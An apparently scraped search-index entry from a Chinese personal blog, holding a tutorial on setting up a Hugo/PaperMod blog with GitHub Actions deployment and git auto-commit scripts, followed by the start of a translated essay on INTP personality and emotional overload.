id=\u0026#34;googleslides_shortcodes\u0026#34;\u0026gt; \u0026lt;iframe id=\u0026#34;googleSlideIframe\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; src=\u0026#34;{{ .Get \u0026#34;src\u0026#34; }}\u0026#34; frameborder=\u0026#34;0\u0026#34; allowfullscreen=\u0026#34;\u0026#34; \u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!-- ———————————————— 版权声明：本文为「Sulv\u0026#39;s Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://www.sulvblog.cn/posts/blog/shortcodes/#1-%e5%bc%95%e5%85%a5-ppt-%e5%8a%9f%e8%83%bd --\u0026gt; 引用（去掉removethis）\n1 {{removethis\u0026lt; ppt src=\u0026#34;0day2.pdf\u0026#34; \u0026gt;}} Papermode主题支持哪些配置项 将官方的配置文件 https://adityatelange.github.io/hugo-PaperMod/posts/papermod/papermod-installation/#sample-configyml 这个yaml文件通过 https://www.convertsimple.com/convert-yaml-to-toml/ 转化为 toml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 # papermod_available_config_backup.toml baseURL = \u0026#34;https://examplesite.com/\u0026#34; title = \u0026#34;ExampleSite\u0026#34; paginate = 5 theme = \u0026#34;PaperMod\u0026#34; enableRobotsTXT = true buildDrafts = false buildFuture = false buildExpired = false googleAnalytics = \u0026#34;UA-123-45\u0026#34; pygmentsUseClasses = true [minify] disableXML = true minifyOutput = true [params] env = \u0026#34;production\u0026#34; title = \u0026#34;ExampleSite\u0026#34; description = \u0026#34;ExampleSite description\u0026#34; keywords = [ \u0026#34;Blog\u0026#34;, \u0026#34;Portfolio\u0026#34;, \u0026#34;PaperMod\u0026#34; ] author = \u0026#34;Me\u0026#34; images = [ \u0026#34;\u0026lt;link or path of image for opengraph, twitter-cards\u0026gt;\u0026#34; ] DateFormat = \u0026#34;January 2, 2006\u0026#34; defaultTheme = \u0026#34;auto\u0026#34; disableThemeToggle = false ShowReadingTime = true ShowShareButtons = true ShowPostNavLinks = true ShowBreadCrumbs = true ShowCodeCopyButtons = false ShowWordCount = true ShowRssButtonInSectionTermList = true UseHugoToc = true disableSpecial1stPost = false disableScrollToTop = false comments = false hidemeta = false hideSummary = false showtoc = false tocopen = false [params.assets] favicon = \u0026#34;\u0026lt;link / abs url\u0026gt;\u0026#34; favicon16x16 = \u0026#34;\u0026lt;link / abs url\u0026gt;\u0026#34; favicon32x32 = \u0026#34;\u0026lt;link / abs url\u0026gt;\u0026#34; apple_touch_icon = \u0026#34;\u0026lt;link / abs url\u0026gt;\u0026#34; safari_pinned_tab = \u0026#34;\u0026lt;link / abs url\u0026gt;\u0026#34; [params.label] text = \u0026#34;Home\u0026#34; icon = \u0026#34;/apple-touch-icon.png\u0026#34; iconHeight = 35 [params.profileMode] enabled = false title = \u0026#34;ExampleSite\u0026#34; subtitle = \u0026#34;This is subtitle\u0026#34; imageUrl = \u0026#34;\u0026lt;img location\u0026gt;\u0026#34; imageWidth = 120 imageHeight = 120 imageTitle = \u0026#34;my image\u0026#34; [[params.profileMode.buttons]] name = \u0026#34;Posts\u0026#34; url = \u0026#34;posts\u0026#34; [[params.profileMode.buttons]] name = \u0026#34;Tags\u0026#34; url = \u0026#34;tags\u0026#34; [params.homeInfoParams] Title = \u0026#34;Hi there 👋\u0026#34; Content = \u0026#34;Welcome to my blog\u0026#34; [[params.socialIcons]] name = \u0026#34;twitter\u0026#34; url = \u0026#34;https://twitter.com/\u0026#34; [[params.socialIcons]] name = \u0026#34;stackoverflow\u0026#34; url = \u0026#34;https://stackoverflow.com\u0026#34; [[params.socialIcons]] name = \u0026#34;github\u0026#34; url = \u0026#34;https://github.com/\u0026#34; [params.analytics.google] SiteVerificationTag = \u0026#34;XYZabc\u0026#34; [params.analytics.bing] SiteVerificationTag = \u0026#34;XYZabc\u0026#34; [params.analytics.yandex] SiteVerificationTag = \u0026#34;XYZabc\u0026#34; [params.cover] hidden = true hiddenInList = true hiddenInSingle = true [params.editPost] URL = \u0026#34;https://github.com/\u0026lt;path_to_repo\u0026gt;/content\u0026#34; Text = \u0026#34;Suggest Changes\u0026#34; appendFilePath = true [params.fuseOpts] isCaseSensitive = false shouldSort = true location = 0 distance = 1_000 threshold = 0.4 minMatchCharLength = 0 keys = [ \u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;, \u0026#34;content\u0026#34; ] [[menu.main]] identifier = \u0026#34;categories\u0026#34; name = \u0026#34;categories\u0026#34; url = \u0026#34;/categories/\u0026#34; weight = 10 [[menu.main]] identifier = \u0026#34;tags\u0026#34; name = \u0026#34;tags\u0026#34; url = \u0026#34;/tags/\u0026#34; weight = 20 [[menu.main]] identifier = \u0026#34;example\u0026#34; name = \u0026#34;example.org\u0026#34; url = \u0026#34;https://example.org\u0026#34; weight = 30 [markup.highlight] noClasses = false 自定义首页及同级子目录的layout 在blog/content下新建一个mind目录，其中放一个 _index.md 文件，内容如下\n1 2 3 4 --- title: 随笔 layout: mindlist --- 在 blog\\layouts\\_default 下放list.html 和mindlist.html分别作为首页和mind目录的列目录的layout\nlist.html如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 {{- define \u0026#34;main\u0026#34; }} {{- $pages := (.Site.GetPage \u0026#34;post\u0026#34;).Pages}} {{- range $pages.GroupByPublishDate \u0026#34;2006\u0026#34; }} \u0026lt;div class=\u0026#34;archive-posts\u0026#34;\u0026gt; {{- range .Pages }} {{- if eq .Kind \u0026#34;page\u0026#34; }} \u0026lt;div class=\u0026#34;archive-entry\u0026#34;\u0026gt; {{- .Date | time.Format (\u0026#34;2006-01-02\u0026#34;) }} \u0026amp;nbsp; \u0026amp;nbsp; \u0026amp;nbsp; \u0026amp;nbsp; {{- .Title | markdownify }} {{- if .Draft }}\u0026lt;sup\u0026gt;\u0026lt;span class=\u0026#34;entry-isdraft\u0026#34;\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;[draft]\u0026lt;/span\u0026gt;\u0026lt;/sup\u0026gt;{{- end }} \u0026lt;a class=\u0026#34;entry-link\u0026#34; aria-label=\u0026#34;post link to {{ .Title | plainify }}\u0026#34; href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; {{- end }} {{- end }} \u0026lt;/div\u0026gt; {{- end }} {{- end }}{{/* end main */}} mindlist如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 {{- define \u0026#34;main\u0026#34; }} {{- $pages := (.Site.GetPage \u0026#34;mind\u0026#34;).Pages}} {{- range $pages.GroupByPublishDate \u0026#34;2006\u0026#34; }} \u0026lt;div class=\u0026#34;archive-posts\u0026#34;\u0026gt; {{- range .Pages }} {{- if eq .Kind \u0026#34;page\u0026#34; }} \u0026lt;div class=\u0026#34;archive-entry\u0026#34;\u0026gt; {{- .Date | time.Format (\u0026#34;2006-01-02\u0026#34;) }} \u0026amp;nbsp; \u0026amp;nbsp; \u0026amp;nbsp; \u0026amp;nbsp; {{- .Title | markdownify }} {{- if .Draft }}\u0026lt;sup\u0026gt;\u0026lt;span class=\u0026#34;entry-isdraft\u0026#34;\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;[draft]\u0026lt;/span\u0026gt;\u0026lt;/sup\u0026gt;{{- end }} \u0026lt;a class=\u0026#34;entry-link\u0026#34; aria-label=\u0026#34;post link to {{ .Title | plainify }}\u0026#34; href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; {{- end }} {{- end }} \u0026lt;/div\u0026gt; {{- end }} {{- end }}{{/* end main */}} 在站点config.toml 中添加页面右上角的导航。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 [[menu.main]] identifier = \u0026#34;Tech\u0026#34; name = \u0026#34;Tech\u0026#34; url = \u0026#34;/\u0026#34; weight = 10 [[menu.main]] identifier = \u0026#34;Mind\u0026#34; name = \u0026#34;Mind\u0026#34; url = \u0026#34;/mind/\u0026#34; weight = 20 [[menu.main]] identifier = \u0026#34;About\u0026#34; name = \u0026#34;About\u0026#34; url = \u0026#34;/about/\u0026#34; weight = 30 [[menu.main]] identifier = \u0026#34;Search\u0026#34; name = \u0026#34;Search\u0026#34; url = \u0026#34;/search/\u0026#34; weight = 40 [[menu.main]] identifier = \u0026#34;Feed\u0026#34; name = \u0026#34;Feed\u0026#34; url = \u0026#34;/sitemap.xml\u0026#34; weight = 50 [[menu.main]] identifier = \u0026#34;GitHub\u0026#34; name = \u0026#34;GitHub\u0026#34; url = \u0026#34;https://github.com/findneo\u0026#34; weight = 60 一些全局快捷键 有点儿小惊喜，该主题全局支持一些快捷键\n1 2 3 4 5 6 7 8 9 10 11 $ rg accesskey themes/hugo-PaperMod-7.0 themes/hugo-PaperMod-7.0/layouts/partials/header.html 47: \u0026lt;a href=\u0026#34;{{ \u0026#34;\u0026#34; | absLangURL }}\u0026#34; accesskey=\u0026#34;h\u0026#34; title=\u0026#34;{{ $label_text }} (Alt + H)\u0026#34;\u0026gt; 77: \u0026lt;button id=\u0026#34;theme-toggle\u0026#34; accesskey=\u0026#34;t\u0026#34; title=\u0026#34;(Alt + T)\u0026#34;\u0026gt; 130: {{- cond $is_search (\u0026#34; accesskey=/\u0026#34; | safeHTMLAttr) (\u0026#34;\u0026#34; | safeHTMLAttr ) }}\u0026gt; themes/hugo-PaperMod-7.0/layouts/partials/footer.html 17:\u0026lt;a href=\u0026#34;#top\u0026#34; aria-label=\u0026#34;go to top\u0026#34; title=\u0026#34;Go to Top (Alt + G)\u0026#34; class=\u0026#34;top-link\u0026#34; id=\u0026#34;top-link\u0026#34; accesskey=\u0026#34;g\u0026#34;\u0026gt; themes/hugo-PaperMod-7.0/layouts/partials/toc.html 6: \u0026lt;summary accesskey=\u0026#34;c\u0026#34; title=\u0026#34;(Alt + C)\u0026#34;\u0026gt; 具体功能如下\n1 2 3 4 5 Alt + H 回到首页，back Home Alt + T 切换主题，change Theme Alt + / 全站搜索 Alt + G 回到页顶，go to Top Alt + C 展开和收起目录,Collapse toc 批量修改文件名为小写 如果文件夹名字中含有大写字符，图片可能无法显示\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 # rename_upperletter.py # python3 import os def upper_to_lower(name): res=\u0026#39;\u0026#39; for i in name: if i.isupper(): res+=i.lower() else: res+=i return res def main(): for root, dirs, files in os.walk(os.path.abspath(\u0026#34;content\u0026#34;)): for file in files: if not file.endswith(\u0026#34;.md\u0026#34;): continue for x in file: if x.isupper(): before_name=os.path.join(root,file) after_name=upper_to_lower(before_name) print(\u0026#34;%s =\u0026gt; %s\u0026#34;%(before_name,after_name)) os.renames(before_name,after_name) break for dir in dirs: for d in dir: if d.isupper(): before_name=os.path.join(root,dir) after_name=upper_to_lower(before_name) print(\u0026#34;%s =\u0026gt; %s\u0026#34;%(before_name,after_name)) os.renames(before_name,after_name) # exit(1) break if __name__ == \u0026#39;__main__\u0026#39;: main() 更多魔改 参考这位朋友的博客，实现了许多看起来很不错的功能：https://www.sulvblog.cn/posts/blog/\nGitHub Action发布 参考 https://yangt.me/post/hugo-blog-with-github-actions/#github-actions\n触发条件设置为 on push\n1 2 3 4 on: push: braches: - master error:Waiting for a runner to pick up this job 如果 action 迟迟不被执行，提示 waiting-for-a-runner-to-pick-up-this-job 那么可能是因为选择的平台不再被支持。比如应该将 runs-on: ubuntu-18.04 换成 runs-on: ubuntu-latest 。 参考此文：https://stackoverflow.com/questions/70959954/error-waiting-for-a-runner-to-pick-up-this-job-using-github-actions 。\n定时任务 此文（https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#schedule）说GitHub action的定时任务是基于UTC时间的。所以只要根据时区相应计算就可以。\n比如北京时间 22:24 执行 定时任务就设置为如下\n1 2 3 on: schedule: - cron: \u0026#34;24 14 * * *\u0026#34; 同时通过定时任务触发和手动触发更新博客 参考 https://docs.github.com/en/actions/managing-workflow-runs/manually-running-a-workflow?tool=cli 添加一个触发条件，然后就能看到下面这个 Run workflow，不然看不到。\n1 2 3 4 on: workflow_dispatch: schedule: - cron: \u0026#34;24 14 * * *\u0026#34; 使用restAPI手动更新博客：workflow_dispatch.sh 根据 https://docs.github.com/en/actions/managing-workflow-runs/manually-running-a-workflow#running-a-workflow-using-the-rest-api ，我们可以通过浏览器触发、github cli触发和restAPI触发。\n参考 https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event 填上参数，写成 sh 脚本就可以通过命令行手动更新博客了。在每日定时更新之外又多了一种更新方式。\n1 2 3 4 5 6 7 curl -L \\ -X POST \\ -H \u0026#34;Accept: application/vnd.github+json\u0026#34; \\ -H \u0026#34;Authorization: Bearer \u0026lt;YOUR-TOKEN\u0026gt;\u0026#34;\\ -H \u0026#34;X-GitHub-Api-Version: 2022-11-28\u0026#34; \\ https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/dispatches \\ -d \u0026#39;{\u0026#34;ref\u0026#34;:\u0026#34;topic-branch\u0026#34;,\u0026#34;inputs\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;Mona the Octocat\u0026#34;,\u0026#34;home\u0026#34;:\u0026#34;San Francisco, CA\u0026#34;}}\u0026#39; 其中 WORKFLOW_ID 是workflow文件中定义的ID，也可以直接用workflow的yaml文件的名字，我这里是 hugo.yml 。\n参考 https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token 获得 \u0026lt;YOUR-TOKEN\u0026gt; ，并且替换到文件中。TOKEN要选择fine-grained personal access token （需要对目标repo有 actions:write 的权限），有效期最长一年。\n1 2 3 4 5 6 7 curl -L \\ -X POST \\ -H \u0026#34;Accept: application/vnd.github+json\u0026#34; \\ -H \u0026#34;Authorization: Bearer \u0026lt;需要替换这个YOUR-TOKEN\u0026gt;\u0026#34;\\ -H \u0026#34;X-GitHub-Api-Version: 2022-11-28\u0026#34; \\ https://api.github.com/repos/findneo/priblog/actions/workflows/hugo.yml/dispatches \\ -d \u0026#39;{\u0026#34;ref\u0026#34;:\u0026#34;master\u0026#34;}\u0026#39; workflow_dispatch.sh\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash ./ok.sh \u0026#34;this is a commmit before manual update github page immediately\u0026#34; echo \u0026#39;triggerring workflow dispatch...\u0026#39; curl -L \\ -X POST \\ -H \u0026#34;Accept: application/vnd.github+json\u0026#34; \\ -H \u0026#34;Authorization: Bearer [TOKEN]\u0026#34;\\ -H \u0026#34;X-GitHub-Api-Version: 2022-11-28\u0026#34; \\ https://api.github.com/repos/findneo/priblog/actions/workflows/hugo.yml/dispatches \\ -d \u0026#39;{\u0026#34;ref\u0026#34;:\u0026#34;master\u0026#34;}\u0026#39; 🔨只有当上次运行之后仓库有更新才执行push，否则什么也不做 为了避免网站页面的更新时间总是变化。\n更新仓库后github page没有刷新内容 可能的原因非常的多，我这里最后发现的原因非常地细微。最开始使用的是如下的yaml文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 name: deploy hugo pages on: schedule: - cron: \u0026#34;24 14 * * *\u0026#34; push: braches: - master env: GIT_USER: ci GIT_EMAIL: ci@github.com GIT_PRIVATEKEY: ${{ secrets.HUGO }} DATA_REPO: findneo/findneo.github.io DATA_REPO_BRANCH: master DATA_LOCAL_PATH: public jobs: build: runs-on: ubuntu-latest steps: - name: Checkout Repo uses: actions/checkout@master - name: build local blog run: | echo \u0026#34;### installing hugo and build blog static pages... ###\u0026#34; wget https://github.com/gohugoio/hugo/releases/download/v0.111.1/hugo_extended_0.111.1_linux-amd64.tar.gz tar xzf hugo_extended_0.111.1_linux-amd64.tar.gz ./hugo --minify rm -f hugo_extended_0.111.1_linux-amd64.tar.gz LICENSE README.md hugo - name: Push changes run: | echo \u0026#34;### setting up git repo and pushing change... ###\u0026#34; pwd ls -lhA sudo timedatectl set-timezone \u0026#34;Asia/Shanghai\u0026#34; mkdir -p ~/.ssh/ echo \u0026#34;${{ env.GIT_PRIVATEKEY }}\u0026#34; \u0026gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com \u0026gt;\u0026gt; ~/.ssh/known_hosts git config --global user.email ${{ env.GIT_EMAIL }} git config --global user.name ${{ env.GIT_USER }} cd ${{ env.DATA_LOCAL_PATH }} git init . git add . git commit -m \u0026#34;update blog static pages\u0026#34; git remote add origin git@github.com:${{ env.DATA_REPO }}.git git push -f origin master rm -rf ~/.ssh/ 注意到第47行是 git add . 。后来发现这个命令并不是追踪所有变化，而是只跟踪已有文件的变化，即修改和删除的操作。若要追踪所有变化，需要使用 git add -A 。\n所以这里的原因实际上是没有push上去更新的内容。\n一键更新ok.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/bin/bash git status read -p \u0026#34;========================= Press [Enter] to continue Press [CTRL+C] to stop ========================= \u0026#34; git add -A if [ \u0026#34;$1\u0026#34; = \u0026#34;\u0026#34; ] then git commit -m \u0026#34;simple update, no msg.\u0026#34; else git commit -m \u0026#34;$1\u0026#34; fi git push 需要注意，git add -A 和 git add -a 是不同的。前者会包含新增的文件，后者只包含修改和删除的文件。git add -A 等价于 git add . 加上 git add -u 。\n如果在Windows里面编辑的sh脚本在WSL中运行时报错\n1 2 3 ./ok.sh: line 2: $\u0026#39;\\r\u0026#39;: command not found \u0026#39; is not a git command. See \u0026#39;git --help\u0026#39;. ... 可以使用以下命令，转换后即可使用\n1 dos2unix.exe ok.sh 使用Linux本地定时任务每3分钟任务同步保存一次博客 脚本 autocommit_if_things_change.sh\n1 2 3 4 #!/bin/bash git add -A git commit -m \u0026#34;this is a auto commit every 3 minutes if things in current repo changes\u0026#34; git push 定时任务（此方法不行，因为WSL中的cron不好使）\n1 2 $ tail /var/spool/cron/crontabs/bob -n1 */3 * * * * cd /mnt/d/hakbase/priblog \u0026amp;\u0026amp; sh autocommit_if_things_change.sh 使用Windows本地定时任务每3分钟任务同步保存一次博客 可以使用这个方法，执行以后后台一直运行，每分钟自动commit一次 autocommit_if_things_change.sh\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash # https://github.com/microsoft/WSL/issues/9072 # wsl -d ubuntu bash -c \u0026#34;nohup sh /mnt/d/hakbase/priblog/autocommit_if_things_change.sh \u0026gt;/dev/null \u0026amp;\u0026#34; # wsl -d ubuntu bash -c \u0026#34;nohup sh /mnt/d/hakbase/priblog/autocommit_if_things_change.sh \u0026lt;/dev/null \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; while true do sleep 60s cd /mnt/d/hakbase/priblog/ git add -A git commit -m \u0026#34;this is a auto commit every serveral minutes if things in current repo changes\u0026#34; git push done 通过Windows的“任务计划程序”让该文件在每次用户登录时执行：autocommit_if_things_change.bat\n1 wsl -d ubuntu bash -c \u0026#34;nohup sh /mnt/d/hakbase/priblog/autocommit_if_things_change.sh \u0026lt;/dev/null \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; 新建、编辑、预览和发布草稿 1 2 3 4 5 新建 hugo new draft/my-draft.md 预览 hugo server --buildDrafts 访问 http://localhost:1313/draft/ 发布 hugo publish draft/my-draft.md 列举草稿 hugo list drafts 待办事项 优化代码块显示效果 博客内容密码保护 匿名化和清理typora的图片 评论区：https://github.com/giscus/giscus 优化目录样式，长目录折叠 优化移动端展示效果 全站加密，全量发布，定期自动更新密钥。输入密码以后才能访问搜索页面。 ","permalink":"https://ret2neo.cn/post/230509-brandnew-blog-based-on-hugo-and-githubci/","summary":"很长一段时间，我的博客是用的hexo，也用博客记录过 搭建过程 ，但有几个不太舒服的地方\n一是依赖过重，每次在一台新电脑上安装node+npm+hexo环境都会出现一些新问题 二是构建速度比较慢 这次尝试用hugo+PaperMod主题+github action搭建一个新的博客，保持简洁的风格，同时能够利用CI自动构建，此后写博客所做的事情只是新建和编辑markdown文件，push到git仓库就可以了。\n此外增强了PaperMod的搜索功能，目前还算满意。\n放两张新旧博客界面的截图，作为纪念。\nPaperMod配置和魔改 自定义html/js/css 可以在网站根目录下相应目录建立文件，构建时会被merge，并且优先级高于papermod的对应文件，就可以在不更改原有主题的前提下起到覆盖和增加主题文件的效果了。\n比如我这里自定义了 blank.css/fastsearch.js/list.html/toc.html 这几个文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ ls -lhR assets/css/extended/ assets/js/ layouts/ themes/hugo-PaperMod-7.0/assets/css/extended/ themes/hugo-PaperMod-7.0/assets/js/ themes/hugo-PaperMod-7.0/layouts/partials/toc.html -rwxrwxrwx 1 bob bob 4.3K Feb 12 14:53 themes/hugo-PaperMod-7.0/layouts/partials/toc.html assets/css/extended/: total 4.0K -rwxrwxrwx 1 bob bob 1.","title":"基于 GitHub Action 和 hugo 构建全新的博客"},{"content":" 本文翻译自：http://www.intpexperience.com/Overload.php\n原文域名已过期，可使用cache查看：https://web.archive.org/web/20230219221929/www.intpexperience.com/Overload.php\n第二章：过载（译文） 实话说，我非常喜欢作为INTP的自己，这样的存在就像是有神兵利器在手。然而，这样的存在也有相应的盲点和陷阱。并且往往，看不见的危险带来最大的伤害，就像被神奇女侠的隐形喷气式飞机击中，伤痕累累躺着，抬头却只见到清澈的天空。\n今天，我要关注过载这个话题。这是一个非常隐秘的INTP陷阱，因为过载是由我们最喜欢和珍视的分析功能导致的。你越用分析功能尝试解决自己的不快乐，你伤自己越深，你的铠甲也是你的软肋。\n让我们做个思想实验。现在你是一个刚走出洞穴的原始人，世界对你是全新的、完全开放的。这是一个炎炎夏日，你的皮肤感受到一种有趣的感觉，今天我们管这种感觉叫做“热”。另一个早晨，你走出洞穴，你感觉到一种不同的感觉，天空阴沉，寒风如刀，我们今天管这个叫“冷”。这两种感受困扰着你，是什么使你感受到这些不同？是某种看不见的神明在操纵你的身体吗？还是因为你吃了什么？你的大脑进入了分析模式。\n你注意到天空中闪亮的大球照到你的时候，你的皮肤感受到一种更强烈的感觉，而当你走进阴影，皮肤上的感觉渐渐消失。有点意思，也许是土壤、树木和岩石从大球中吸收了什么，又把它释放到空气中。也许是大球造成了“热”。\n但是且慢，你日渐注意到季节变换，每天的冷热都不同，有时夜里甚至很热，有时天晴却很冷。你感到越发困惑。从关注气候开始，你又逐步开始研究空气流动、海洋温度、全球水流、地球轨道、太阳耀斑和臭氧层，诸如此类。每个新发现都带来更多的可能性。但随着你钻研深入，找到了越来越多问题的答案，最终你开始慢慢接近自身能量的极限。观察和假想日渐堆积，问题的复杂性引发麻痹和妥协，我们开始将那些困惑标记为不可解决，我们觉得自己已经积累了足够多的信息，足以推断自己无法达到问题解决的彼岸了。对于INTP，对任何主题的长期关注最终都可能将我们引入过载的困境，但有一个领域似乎更容易成为泥潭，那就是上一篇文章说的，人际关系和疏离感。\n如果你感到疏离，我打赌你能拿出一大堆你在这个主题上收集的信息和做出的分析。你能说出一大堆童年阴影，原生家庭父母的忽视和误解，你能给出你的理论。你观察到许多真相。你和大学舍友的关系从亲密承诺开始，到日渐疏远，最终被孤立。你解构自己和世界的互动，构建起一套关于你需要找到哪一类人以及可以在哪里找到他们的理论。你还可以说出来，不止一次，你觉得自己找到了那个人，但随后某个事件又证明自己搞错了。\n所有这些信息构建起关于问题的日渐庞大的概念。为什么问题越来越复杂了呢？因为我们想要精确又完全地解决这些问题，否则我们不会感到满足。我们不断尝试可能的解决办法然后回过头来观察结果，我们又把每次失败看作一个新的可供分析的样本，周而复始。这就是我们的理性乐观，我们觉得解决方案一定存在，我们只是需要更努力一些。\nINTP的陷阱在于你彻底的坚定不移的对解决问题的尝试实质上增加了问题本身的复杂度。而这种复杂性又会反过来告诉你问题不可解决，或者至少超出你的能力范围了。然后呢，你会怎么做？你更加用力了。随着问题的复杂性的增加，你更用力地分析他们。这种滚雪球式的信息过载会催生很多负面情绪，疲惫、沮丧、失望日渐堆积，最终，你会走向绝望。\nINTP最容易在人际关系领域陷入深深的过载。最可能的原因是，关系涉及情绪，而情绪不可捉摸。你要处理自己的情绪（即便你觉得自己没什么情绪波动），还要处理别人的情绪。因为INTP比起拥抱情绪，更倾向于压抑情绪（尽管这也是一个情绪驱动的决定），所以虽然我们不那么渴望拥有相关技能，但实质上我们需要。那么让我们来以最符合逻辑的方式来解决人际关系的问题。鉴于我们自身的情绪最终决定了我们是享受生活还是被生活折磨，我们就从自身情绪出发来考虑这个事情。\n我的提议非常简单，但对INTP的思维模式来说会很陌生。如果过载是由于追求精确和关注点过大导致的，那么幸福就可以通过不那么严苛和着眼于细微之处来实现。值得一提的是，关注点更小意味着你会得到碎片化的而不是宏大的解决方案，离散的细微的成功，尽管每一次都很微小，但聚沙成塔，最终也能收获颇丰。\n所以，如何缩小我们在人际关系上的关注点呢？假设说你和某人有过一些交往，尽管你曾期望这是个能有共鸣的灵魂，但你观察到了太多的不协调，于是认为共鸣不会发生。现在你有机会和这人再喝几杯咖啡，你的理智脑说“何必呢，我早知道这人并不投缘，一起呆完我只会更沮丧，不如不去”。这就是过载型思维。也许这人身上的某个部分你会喜欢，也许通过一起喝杯咖啡你们能够开开玩笑，也许某些事情你们可以共情。如果你仅仅只是寻找玩笑或者共情，你就可以享受这人短暂的陪伴。你感到一丝丝快乐，因为在这个瞬间，你感觉良好。\n我想告诉你，感觉不好本身就不好，感觉好本身就是好的。尽管一杯咖啡无益于解决你在世上的问题，但至少你在咖啡店里面的那半个小时感到开心。这就是有意义的。这就是好的。你解决问题了吗？没有。你最终会认为这人是个志趣相投的灵魂吗？不会。这不是一个完美答案，这是局部优解，是权宜之计。但积少成多，这都是你的收获。\n留心那些可以让你体验到短暂快乐的机会。当你去体验这个快乐的时候，放松你严苛的理性的大脑。更多关注自己的情绪状态。如果在体验过程中遇到小挫败，克制进入负面情绪的冲动。收集越来越多这样的时刻，以此构建一定的稳定性和未来的可预测性。搞清楚哪些朋友是你可以出于什么原因去拜访的。通过让成功获取小的快乐成为生活的一种选择，你就拥有了获取更多快乐的方法。\n我刚刚所描述的东西对其他人格来说可能显得非常无脑。但对INTP来说，这并非自然而然的，这需要努力。让我再说清楚一点儿，这不是疏离感的答案。作为INTP，时至今日我仍然相信，本质上，我们是疏离的。（译者注：如果一个成熟的INTP仍然觉得是这样的。那么，有一种可能，某种程度上，你感到和世界的疏离，不是因为你有什么缺陷。而只是因为你太聪明了，而又太过固执了。世界中个体的本质是分离的，唯一区别是其中的个体是否感受到这种分离。没有疏离感或者疏离感较弱的人，是对这种个体间的分离不那么敏感、没有强烈感受的人，能够容忍幻象，并在幻象中忘却真实，而你，INTP，你时不时跳出来，总是记得真相，总是强烈而自觉地感受到一切事物人之间的分离性，总是对亲密保持怀疑和警惕，总是无法感到真正的联系。这是你的幸运，也是你的悲哀。你是黑客帝国中选择了红药丸的角色，你注定过清醒而痛苦的生活。如果一切没有解，那么请你拥抱真实的自我，同时，也对自己好一点，不必过于严苛，时不时找一点儿微小的乐子，去码头整点薯条，没有关系的，不要太执着。如果一切有解，那么唯一解就是向某个人事物臣服，暴露你的缺陷，献祭你的自由，获得它的认可，接受它的拥抱，同时承担它抛弃你的危险。做到这一切也并不难，唯一需要的是勇气。）然而，尽管这些做法没有解决问题，但他们确实在情绪方面帮助我们达成了一定的训练、经验和成功。情绪比我们想象的更可控，他们只是情境的产物。我们有很多机会根据自己的感受做出决定，但我们首先要停止犯一个错误，那就是将情绪解释为在暗示某种事实。（译者注：这里的意思大约是，不要将情绪看得过于重要，他是没有深意的，变动不居的，稍纵即逝的，仅仅是环境的产物，能够说明一些问题，但仅仅是很浅层的问题，是不值得深入挖掘和分析的。太过严肃对待只会使我们疲惫。）\n所有人格类型都会曲解情绪传递出来的信息。情绪仅仅是人性使然。举例来说，你在黑暗的房间里面感到害怕，因为你觉得暗处可能有人，但这并不意味着暗处真的有人。但在当时大脑不这么想。它觉得我们感到害怕是因为暗处很可能确实有人。情绪会被解释成对事实的暗示。拿人的五感（视觉、听觉、嗅觉、味觉、触觉）举例，如果你看到火炉热得发光，你就不会去触碰它。同理，如果你感到恐惧，一定是有什么恐怖的东西。情绪塑造了我们对于现实的感知。\n情绪塑造了我们对于现实的感知，这一点对于疏离感也适用。我们是因为疏离而感到沮丧，还是我们先感到沮丧，然后错误地假设疏离是背后的客观原因。我想常常发生的是后者。疏离感一半是真实的一半是想象的，因为那时情绪本身已经不堪重负。如果我们能摆脱想象的那部分疏离感，我们就能达到更好的情绪平衡，避免失控。也许我们没有自己想象中的那么疏离，也许有相当多值得我们感到开心的事物。\n最后，对于大哉问的解决方案也许依然存在。永远充满希望。并且如果没有过载和螺旋式失败的重负，这种希望将更健康。与此